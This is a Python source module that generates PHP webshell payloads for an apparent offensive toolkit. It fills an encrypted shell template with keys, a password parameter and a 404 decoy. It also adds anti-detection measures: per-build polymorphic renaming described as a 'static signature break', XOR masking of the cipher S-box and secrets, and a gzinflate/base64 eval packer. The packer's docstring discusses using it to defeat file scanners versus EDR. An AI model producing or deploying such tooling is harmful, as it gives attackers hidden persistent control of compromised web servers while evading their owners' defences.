"""Webshell payload generators.

PHP only. v1 = classic SM4-CBC + Base64 with a fixed key/iv (kept for older
shells); v2 = HKDF + HMAC envelope with carriers, padding and a 404 gate.


Static hardening levels:
    plain  readable source, no obfuscation
    light  secret/salt stored XOR-masked in a base64 blob, rebuilt at runtime
    packed gzinflate+base64 stub around the whole handler (classic packer)
"""

from __future__ import annotations

import base64
import os
import random
import re
import string
import zlib
from dataclasses import dataclass
from pathlib import Path

from ..crypto import sm4

TEMPLATE_DIR = Path(__file__).with_name("templates")
DECOY_DIR = Path(__file__).with_name("decoys")


def decoy_path(name: str) -> Path | None:
    path = DECOY_DIR / f"{name}.html"
    return path if path.is_file() else None


def decoy_names() -> list[str]:
    if not DECOY_DIR.is_dir():
        return []
    return sorted(p.stem for p in DECOY_DIR.glob("*.html"))

KEY_TOKEN = "@@KEY_HEX@@"
IV_TOKEN = "@@IV_HEX@@"
PASS_TOKEN = "@@PASS@@"
MARK_TOKEN = "@@MARK@@"
PROTO_TOKEN = "@@PROTO@@"
SECRET_TOKEN = "@@SECRET_EXPR@@"
SALT_TOKEN = "@@SALT_EXPR@@"
SKEW_TOKEN = "@@SKEW@@"
DECOY_TOKEN = "@@DECOY_EXPR@@"


@dataclass
class ShellSource:
    language: str
    code: str
    key_hex: str
    iv_hex: str
    pass_param: str
    filename: str
    proto: str = "v1"
    secret_hex: str = ""
    salt_hex: str = ""
    hardening: str = "plain"
    carrier: str = "form"


def _masked_expr(value_hex: str) -> str:
    """Hide a hex credential: (hex-text XOR pad) -> base64.

    The runtime rebuilds the *hex string* (PHP then hex2bin()s it), not the raw
    key bytes — passing bytes here would silently corrupt the key.
    """
    raw = value_hex.encode("ascii")
    pad = os.urandom(8)
    masked = bytes(byte ^ pad[i % len(pad)] for i, byte in enumerate(raw))
    blob = base64.b64encode(masked).decode("ascii")
    return f"wm_unwrap('{blob}','{pad.hex()}')"


def _php_string(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"


def _rand_ident(length: int = 6, upper: bool = False) -> str:
    alphabet = string.ascii_uppercase if upper else string.ascii_lowercase
    return random.choice(alphabet) + "".join(
        random.choice(alphabet + string.digits) for _ in range(length - 1)
    )


def _mask_sbox(code: str) -> str:
    """XOR-mask the 256-byte S-box; WmSm4::init() restores it at runtime."""
    match = re.search(r"(public static \$S = array\()(.*?)(\);)", code, re.S)
    if not match:
        return code
    mask = random.randint(1, 255)
    body = match.group(2)

    def flip(m: re.Match[str]) -> str:
        return hex(int(m.group(0), 16) ^ mask)

    masked = re.sub(r"0x[0-9a-fA-F]+", flip, body)
    code = code[:match.start(2)] + masked + code[match.end(2):]
    return code.replace("const MASK = 0x00;", f"const MASK = 0x{mask:02x};", 1)


def _polymorph(code: str, pass_param: str, mark: str) -> tuple[str, str]:
    """Per-build identifier/parameter randomisation (static signature break)."""
    prefix = _rand_ident(6)
    code = re.sub(r"\bwm_", prefix + "_", code)
    code = re.sub(r"\bWM_", prefix.upper() + "_", code)

    sm4_cls = _rand_ident(7, upper=True)
    core_cls = _rand_ident(7, upper=True)
    code = re.sub(r"\bWmSm4\b", sm4_cls, code)
    code = re.sub(r"\bWmCore\b", core_cls, code)

    method_map: dict[str, str] = {}

    def method(m: re.Match[str]) -> str:
        name = m.group(0)
        if name not in method_map:
            method_map[name] = "m" + _rand_ident(7)
        return method_map[name]

    code = re.sub(r"\bop[A-Z][A-Za-z0-9]*\b", method, code)

    crypto_map: dict[str, str] = {}

    def crypto(m: re.Match[str]) -> str:
        name = m.group(0)
        if name not in crypto_map:
            crypto_map[name] = "c" + _rand_ident(7)
        return crypto_map[name]

    code = re.sub(
        r"\b(rotl|tau|expand|block|cbcEncrypt|cbcDecrypt|word)\b",
        crypto,
        code,
    )

    exec_name = "e" + _rand_ident(7)
    code = code.replace("public static function exec(", f"public static function {exec_name}(")
    code = code.replace("self::exec(", f"self::{exec_name}(")

    if mark == "WMCACHE":
        mark = _rand_ident(6, upper=True)
    code = code.replace(MARK_TOKEN, mark)
    code = code.replace(PASS_TOKEN, pass_param)
    return code, pass_param


def render_php(
    key_hex: str,
    iv_hex: str,
    pass_param: str | None = None,
    mark: str = "WMCACHE",
    *,
    proto: str = "v1",
    secret_hex: str = "",
    salt_hex: str = "",
    hardening: str = "plain",
    skew: int = 300,
    decoy: str = "",
) -> str:
    if len(key_hex) != 32 or len(iv_hex) != 32:
        raise ValueError("key/iv must be 32 hex characters")
    if proto == "v2":
        if len(secret_hex) != 64 or len(salt_hex) != 32:
            raise ValueError("v2 needs a 64-char secret and 32-char salt (hex)")
    if hardening not in {"plain", "light", "packed"}:
        raise ValueError(f"unknown hardening level: {hardening}")

    template = (TEMPLATE_DIR / "php_shell.php").read_text(encoding="utf-8")
    if proto == "v2" and hardening == "light":
        secret_expr = _masked_expr(secret_hex)
        salt_expr = _masked_expr(salt_hex)
    else:
        secret_expr = f"'{secret_hex or '00' * 32}'"
        salt_expr = f"'{salt_hex or '00' * 16}'"

    pass_param = pass_param or _rand_ident(6)
    code = (
        template.replace(KEY_TOKEN, key_hex)
        .replace(IV_TOKEN, iv_hex)
        .replace(PROTO_TOKEN, proto)
        .replace(SECRET_TOKEN, secret_expr)
        .replace(SALT_TOKEN, salt_expr)
        .replace(SKEW_TOKEN, str(int(skew)))
        .replace(DECOY_TOKEN, _php_string(decoy))
    )
    code = _mask_sbox(code)
    code, pass_param = _polymorph(code, pass_param, mark)
    if hardening == "packed":
        code = pack_php(code)
    return code


def pack_php(code: str) -> str:
    """Turn the rendered payload into a gzinflate stub.

    Trade-off worth knowing: this defeats `grep`/string scanners but is itself
    a well-known packer pattern, and it makes runtime (sandbox) analysis easier
    to flag. Use it when file-level matching is the main risk, not when EDR
    instrumentation is the main risk.
    """
    body = code
    if body.startswith("<?php"):
        body = body[5:]
    compressor = zlib.compressobj(9, zlib.DEFLATED, -15)  # raw deflate: gzinflate()
    blob = base64.b64encode(
        compressor.compress(body.encode("utf-8")) + compressor.flush()
    ).decode("ascii")
    return (
        "<?php\n"
        "$f = 'gzinflate';\n"
        "$d = 'base64_decode';\n"
        "@eval($f($d('" + blob + "')));\n"
    )


def generate_php(
    key: bytes | None = None,
    iv: bytes | None = None,
    pass_param: str | None = None,
    mark: str = "WMCACHE",
    filename: str = "shell.php",
    *,
    proto: str = "v2",
    secret: str | None = None,
    salt: str | None = None,
    hardening: str = "plain",
    carrier: str = "form",
    skew: int = 300,
    decoy: str = "",
) -> ShellSource:
    key = key or sm4.random_key()
    iv = iv or sm4.random_iv()
    pass_param = pass_param or _rand_ident(6)
    if proto == "v2":
        secret = secret or os.urandom(32).hex()
        salt = salt or os.urandom(16).hex()
        if len(secret) != 64 or len(salt) != 32:
            raise ValueError("secret/salt must be hex (64/32 chars)")
        code = render_php(
            key.hex(),
            iv.hex(),
            pass_param,
            mark,
            proto="v2",
            secret_hex=secret,
            salt_hex=salt,
            hardening=hardening,
            skew=skew,
            decoy=decoy,
        )
    else:
        secret, salt = "", ""
        code = render_php(key.hex(), iv.hex(), pass_param, mark, proto="v1")

    return ShellSource(
        language="php",
        code=code,
        key_hex=key.hex(),
        iv_hex=iv.hex(),
        pass_param=pass_param or "",
        filename=filename,
        proto=proto,
        secret_hex=secret or "",
        salt_hex=salt or "",
        hardening=hardening,
        carrier=carrier,
    )


GENERATORS = {
    "php": generate_php,
}


def generate(language: str, **kwargs) -> ShellSource:
    try:
        factory = GENERATORS[language]
    except KeyError:
        raise ValueError(f"unsupported payload language: {language}") from None
    return factory(**kwargs)
